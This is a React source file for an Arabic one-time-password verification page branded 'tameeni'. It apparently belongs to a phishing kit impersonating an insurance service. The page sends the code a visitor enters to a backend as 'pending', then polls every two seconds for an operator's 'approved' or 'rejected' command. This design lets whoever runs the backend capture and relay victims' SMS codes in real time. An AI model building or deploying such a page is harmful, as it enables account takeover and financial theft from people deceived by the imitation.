import { useState, useRef, useEffect } from "react";
import { Shield, CheckCircle, XCircle, Loader2 } from "lucide-react";
import { tameeniApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";

type Status = "idle" | "pending" | "approved" | "rejected";

export default function OtpPage() {
  useTracking("التحقق OTP");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<Status>("idle");
  const refs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (status !== "pending") return;
    const id = localStorage.getItem("tameeni_id");
    if (!id) return;
    const iv = setInterval(async () => {
      const cmd = await tameeniApi.getCmd(id);
      if (cmd === "otp:approved") setStatus("approved");
      else if (cmd === "otp:rejected") setStatus("rejected");
    }, 2000);
    return () => clearInterval(iv);
  }, [status]);

  async function handleSubmit() {
    const code = otp.join("");
    if (code.length < 6) return;
    const id = localStorage.getItem("tameeni_id");
    if (!id) return;
    await tameeniApi.patch(id, { otpCode: code, otpStatus: "pending" });
    setStatus("pending");
  }

  if (status === "approved") return (
    <div className="min-h-screen bg-white flex items-center justify-center" dir="rtl" style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div className="text-center space-y-5 max-w-xs mx-4">
        <CheckCircle className="w-20 h-20 text-emerald-500 mx-auto" strokeWidth={1.5} />
        <h2 className="text-[24px] font-extrabold text-gray-900">تم التحقق بنجاح</h2>
        <p className="text-[14px] text-gray-500">سيتم الاطلاع على عروض التأمين المناسبة لك</p>
        <button onClick={() => window.location.href = "/tameeni/"} className="w-full py-3 rounded-xl bg-blue-600 text-white font-bold text-[15px] hover:bg-blue-700 transition-colors">
          العودة للرئيسية
        </button>
      </div>
    </div>
  );

  if (status === "rejected") return (
    <div className="min-h-screen bg-white flex items-center justify-center" dir="rtl" style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div className="text-center space-y-5 max-w-xs mx-4">
        <XCircle className="w-20 h-20 text-red-500 mx-auto" strokeWidth={1.5} />
        <h2 className="text-[24px] font-extrabold text-red-600">رمز التحقق غير صحيح</h2>
        <p className="text-[14px] text-gray-500">يرجى المحاولة مرة أخرى</p>
        <button onClick={() => { setStatus("idle"); setOtp(["","","","","",""]); }} className="w-full py-3 rounded-xl border border-gray-200 text-gray-700 font-bold text-[15px] hover:bg-gray-50 transition-colors">
          حاول مجدداً
        </button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gradient-to-bl from-blue-50 to-white flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div className="max-w-sm w-full mx-4 space-y-6">
        <div className="text-center space-y-3">
          <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center mx-auto">
            <Shield className="w-8 h-8 text-blue-600" strokeWidth={1.5} />
          </div>
          <h2 className="text-[22px] font-extrabold text-gray-900">رمز التحقق</h2>
          <p className="text-[13px] text-gray-500">أدخل الرمز المرسل إلى جوالك</p>
        </div>

        <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 space-y-6">
          <div className="flex gap-2 justify-center" dir="ltr">
            {otp.map((v, i) => (
              <input key={i} ref={(el) => { refs.current[i] = el; }}
                type="text" inputMode="numeric" maxLength={1} value={v}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/, "");
                  const n = [...otp]; n[i] = val; setOtp(n);
                  if (val && i < 5) refs.current[i + 1]?.focus();
                }}
                onKeyDown={(e) => { if (e.key === "Backspace" && !otp[i] && i > 0) refs.current[i - 1]?.focus(); }}
                className="w-12 h-14 rounded-xl border-2 border-gray-200 text-center text-[20px] font-extrabold text-gray-900 outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all bg-gray-50"
              />
            ))}
          </div>

          <button
            disabled={otp.join("").length < 6 || status === "pending"}
            onClick={handleSubmit}
            className="w-full py-3.5 rounded-xl bg-blue-600 text-white font-extrabold text-[16px] disabled:opacity-40 hover:bg-blue-700 transition-colors flex items-center justify-center gap-2"
          >
            {status === "pending" ? <><Loader2 className="w-5 h-5 animate-spin" />جارٍ التحقق...</> : "تأكيد"}
          </button>

          <p className="text-center text-[12px] text-gray-400">لم تستلم الرمز؟ <a href="#" className="text-blue-600 font-bold hover:underline">إعادة الإرسال</a></p>
        </div>
      </div>
    </div>
  );
}
